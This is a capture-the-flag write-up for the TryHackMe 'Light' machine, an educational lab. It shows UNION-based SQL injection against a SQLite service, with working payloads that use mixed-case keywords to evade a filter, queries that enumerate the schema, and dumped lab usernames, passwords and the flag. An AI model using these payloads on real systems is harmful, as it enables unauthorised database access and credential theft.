# TryHackMe - Light Machine Write-Up

## Overview

The **Light** machine on TryHackMe is a beginner-friendly challenge that involves SQL injection on a custom database service running on a remote port. The exploitation focuses on SQLite and classic UNION-based injection techniques to extract usernames, passwords, and the final flag.

---

## Target Information

- **IP Address**: `10.10.243.206`
- **Port**: `1337`
- **Service**: Custom database interface via `netcat`
- **Technology**: SQLite 3.31.1

---

## Phase 1: Initial Access

### Connection

No need for Nmap or scanning. The connection is opened directly using `netcat`:

```bash
nc 10.10.243.206 1337
```

You are greeted with:

```
Welcome to the Light database!
Please enter your username: 
```

### Default Credentials Attempt

Entering valid-looking credentials returns a password, but loops:

```
Username: smokey
Password: vYQ5ngPpw8AdUmL
```

This behavior hints at possible **SQL injection**.

---

## Phase 2: SQL Injection

### Injection Discovery

Trying the following reveals a SQL error, confirming injection is possible:

```
Input: admin'
Output: Error: unrecognized token: "'admin'' LIMIT 30"
```

### Bypassing Filters

Simple payloads were blocked, but case manipulation worked:

```sql
' UniOn SeLeCt 1 '
```

This indicates the input is filtered, but not normalized — SQL keywords can be obfuscated with case mixing.

---

## Phase 3: Database Enumeration

### Determine SQLite Version

```sql
' UniOn SeLeCt sqlite_version() '
```

**Output**:

```
Password: 3.31.1
```

---

### List Tables

Query the `sqlite_master` table:

```sql
' UniOn SeLeCt group_concat(sql) FROM sqlite_master '
```

**Output**:

```
Password: CREATE TABLE usertable (...), CREATE TABLE admintable (...)
```

**Identified Tables**:

- `usertable`
- `admintable`

---

## Phase 4: Data Extraction

### Extract Usernames

```sql
' UniOn SeLeCt group_concat(username) FROM usertable '
```

**Output**:

```
alice,rob,john,michael,smokey,hazel,ralph,steve
```

### Extract Passwords

Then query each user individually:

```sql
Username: alice
Password: tF8tj2o94WE4LKC

Username: rob
Password: yAn4fPaF2qpCKpR

Username: john
Password: e74tqwRh2oApPo6

Username: michael
Password: 7DV4dwA0g5FacRe

Username: hazel
Password: EcSuU35WlVipjXG

Username: ralph
Password: YO1U9O1m52aJImA

Username: steve
Password: WObjufHX1foR8d7
```

### Extract Admin Table

**Query Passwords**:

```sql
' UniOn SeLeCt group_concat(password) FROM admintable '
```

**Output**:

```
mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

**Query Usernames**:

```sql
' UniOn SeLeCt group_concat(username) FROM admintable '
```

**Output**:

```
TryHackMeAdmin,flag
```

---

## Flags

- **User Flag**: `vYQ5ngPpw8AdUmL` (smokey's password)
- **Root/Admin Flag**: `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`

---

## Conclusion

This machine demonstrated the power and simplicity of UNION-based SQL injection on a filtered SQLite interface. Obfuscating reserved words helped bypass filtering, and `sqlite_master` revealed the full DB structure.

---

## References

- [PayloadsAllTheThings - SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
